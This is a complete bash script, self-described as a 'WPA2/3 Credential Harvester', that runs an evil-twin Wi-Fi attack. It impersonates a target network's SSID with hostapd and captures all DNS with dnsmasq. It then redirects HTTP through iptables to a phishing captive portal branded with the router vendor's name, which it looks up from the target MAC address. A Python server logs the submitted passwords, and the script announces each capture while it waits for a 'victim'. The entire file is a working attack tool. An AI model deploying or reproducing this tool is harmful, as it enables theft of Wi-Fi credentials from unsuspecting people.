#!/bin/bash

# --- Config ---
DB_URL="http://standards-oui.ieee.org/oui/oui.txt"
OUI_FILE="oui.txt"
TEMPLATE_DIR="templates" 

# Defaults
TEMPLATE_TYPE="wpa"
GATEWAY_IP="10.0.0.1"
INTERFACE_INPUT=""
MAC_INPUT=""
SSID_INPUT=""
VENDOR_INPUT=""

# --- Functions ---
update_db() {
    echo "[+] Connecting to IEEE Server..."
    echo "[+] Pulling OUI database..."
    
    if wget -q -O "$OUI_FILE" "$DB_URL"; then
        echo "[+] Update successfull. Database is up to date."
        exit 0
    else
        echo "[-] Error occurred while pulling OUI database."
        exit 1
    fi
}

show_help() {
    echo "WPA2/3 Credential Harvester v2.0"
    echo "Usage: ./portal_hoster.sh [OPTIONEN]"
    echo ""
    echo "Optionen:"
    echo "  -m, --mac <MAC>      MAC-Adresse of target AP (required)"
    echo "  -t, --type <Typ>     Payload-Type (wpa, admin). Standard: wpa"
    echo "  -u, --update         Updates IEEE OUI-Datenbank"
    echo "  -h, --help           Shows this help"
    echo "  -s, --ssid <SSID>    SSID of impersonated target network"
    echo "  -v, --vendor <Name>  Manual override (Vodafone, Fritzbox...)"
    echo "  -i, --interface <IF> Wireless Interface (e.g. wlan0) (required)"
    exit 0
}

cleanup(){
	echo -e "\n[*] SIGINT..."
	echo "[+] Cleanup"

	kill $SERVER_PID 2>/dev/null
	kill $OBSERVER_PID 2>/dev/null
	kill $HOSTAPD_PID 2>/dev/null
	kill $DNSMASQ_PID 2>/dev/null

	rm -f "$OUTPUT_FILE"
	rm -f "creds.log"
	rm -f "hostapd-rogue.conf"
	rm -f "dnsmasq-rogue.conf"
	rm -f "rogue_server.py"

	echo "[+] Reset iptables and network interfaces"
	iptables -t nat -F 
	ip addr flush dev $INTERFACE_INPUT

	echo "[+] Finished Cleanup and released target. Exiting."
	exit 0
}

# --- ARGUMENT PARSER ---
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -u|--update) update_db ;;
        -h|--help) show_help ;;
        -m|--mac) MAC_INPUT="$2"; shift ;;
        -t|--type) TEMPLATE_TYPE="$2"; shift ;;
        -s|--ssid) SSID_INPUT="$2"; shift;;
        -v|--vendor) VENDOR_INPUT="$2";shift;;
        -i|--interface) INTERFACE_INPUT="$2";shift;;
        *) echo "[-] Unknown argument: $1"; show_help ;;
    esac
    shift # 
done
# --- INPUT VALIDIERUNG ---

# 1. Root-Check
if [[ $EUID -ne 0 ]]; then
   echo "[-] Error: This script must be run as root (sudo)."
   exit 1
fi

# 2. Check required fields
if [[ -z "$MAC_INPUT" || -z "$SSID_INPUT" || -z "$INTERFACE_INPUT" ]]; then
    echo "[-] Error: MAC (-m), SSID (-s) and Interface (-i) are required."
    show_help
fi

# 3. Check MAC format

REGEX="^([0-9a-fA-F]{2}[:-]){5}([0-9a-fA-F]{2})$"

if [[ ! $MAC_INPUT =~ $REGEX ]]; then
    echo "[-] Error: '$MAC_INPUT' is not a valid MAC format."
    exit 1
fi

echo "[+] Registered valid MAC: $MAC_INPUT"

# --- Vendor Setup (Override vs. OUI Lookup) ---

if [[ -n "$VENDOR_INPUT" ]]; then
    # argument -v used -> Override 
    echo "[+] Vendor override active. Skip OUI database."
    VENDOR_NAME="$VENDOR_INPUT"
    echo "[+] Vendor set: $VENDOR_NAME"
else
    # ! Override -> MAC OUI Lookup
    echo "[+] Starting MAC OUI Lookup..."
    echo "[+] Normalize MAC..."

    OUI_RAW="${MAC_INPUT:0:8}"
    OUI_DASHED="${OUI_RAW//:/-}"
    OUI_FINAL="${OUI_DASHED^^}"

    echo "[+] Extracted normalized OUI: $OUI_FINAL"
    echo "[+] Lookup OUI for $OUI_FINAL"

    # 1. Does oui.txt exist?
    if [[ ! -f "$OUI_FILE" ]]; then
        echo "[-] Error: Database '$OUI_FILE' not found"
        echo "[-] Load with: 'wget -O oui.txt http://standards-oui.ieee.org/oui/oui.txt'"
        exit 1
    fi

    # 2. Lookup
    VENDOR_LINE=$(grep -i "$OUI_FINAL" "$OUI_FILE")

    # 3. OUI found?
    if [[ -z "$VENDOR_LINE" ]]; then
        echo "[-] OUI not found in DB."
        VENDOR_NAME="Unknown_Vendor"
    else
        RAW_VENDOR="$VENDOR_LINE"
        CLEAN_VENDOR=$(echo "$RAW_VENDOR" | sed 's/.*(hex)[ \t]*//')
        echo "[+] Vendor found in DB: $CLEAN_VENDOR"
        VENDOR_NAME="$CLEAN_VENDOR"
    fi
    echo "[+] Vendor resolved to: $VENDOR_NAME"
fi

# Captive Portal
echo "[+] Generate dynamic captive portal..."

# Dynamic path based on param -t
TEMPLATE_FILE="${TEMPLATE_DIR}/${TEMPLATE_TYPE}.html"
OUTPUT_FILE="portal.html"

# 1. Check if dynamic template exists
if [[ ! -f "$TEMPLATE_FILE" ]]; then
    echo "[-] Error: Payload template '$TEMPLATE_FILE' not found."
    echo "[-] Please place template in folder '$TEMPLATE_DIR'."
    exit 1
fi

# sed Templating Engine
sed -e "s/{{VENDOR_NAME}}/$VENDOR_NAME/g" -e "s/{{SSID_NAME}}/$SSID_INPUT/g" "$TEMPLATE_FILE" > "$OUTPUT_FILE"

echo "[+] Payload generated: $OUTPUT_FILE"


# --- Hosting & Networking ---
echo "[+] Starting infrastructure..."

# configure interface
ip addr add $GATEWAY_IP/24 dev $INTERFACE_INPUT
ip link set $INTERFACE_INPUT up 

iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# dnsmasq config
echo "[*] Generate DHCP/DNS config"
cat << EOF > dnsmasq-rogue.conf
interface=$INTERFACE_INPUT
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP
address=/#/$GATEWAY_IP
EOF

dnsmasq -C dnsmasq-rogue.conf -d > /dev/null 2>&1 &
DNSMASQ_PID=$!

# 1. hostapd Config (Heredoc)
echo "[*] Generate Rogue AP Config for SSID: $SSID_INPUT"
cat << EOF > hostapd-rogue.conf
interface=$INTERFACE_INPUT
ssid=$SSID_INPUT
hw_mode=g
channel=6
auth_algs=1
wpa=0
EOF

# 2. start hostapd in background
hostapd hostapd-rogue.conf > /dev/null 2>&1 &
HOSTAPD_PID=$!

echo "[+] Generate captive portal webserver..."
cat << 'EOF' > rogue_server.py
import http.server
import socketserver

class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        
        if self.path.startswith('/login?'):
            print(f"GET {self.path} HTTP/1.1") 
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"<html><body>Update in progress. You can close this window.</body></html>")
            return
        
        if self.path == '/portal.html':
            return super().do_GET()
        
        self.send_response(302)
        self.send_header('Location', 'http://10.0.0.1/portal.html')
        self.end_headers()

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("", 8080), CaptivePortalHandler) as httpd:
    httpd.serve_forever()
EOF

# starting custom unbuffered server
touch creds.log
PYTHONUNBUFFERED=1 python3 -u rogue_server.py > creds.log 2>&1 &
SERVER_PID=$!

(tail -f creds.log 2>/dev/null | grep --line-buffered "GET /login?" | while read -r line; do
    LOOT=$(echo "$line" | grep -oP 'GET /login\?\K[^ ]+')
    LOOT_DECODED=$(echo -e "${LOOT//%/\\x}")
    
    echo -e "\n\e[1;32m[!] ALERT: Credentials Captured!\e[0m"
    echo -e "\e[1;32m[!] Payload: $LOOT_DECODED\e[0m\n"
    
    kill -SIGINT $$
    exit 0 
done) &
OBSERVER_PID=$!

trap cleanup SIGINT

echo "[+] Rogue AP ($SSID_INPUT) and portal are live on http://localhost:8080/$OUTPUT_FILE"
echo "[+] Waiting for victim... (CTRL+C to quit)"

# 5. Skript am Leben halten
wait $SERVER_PID
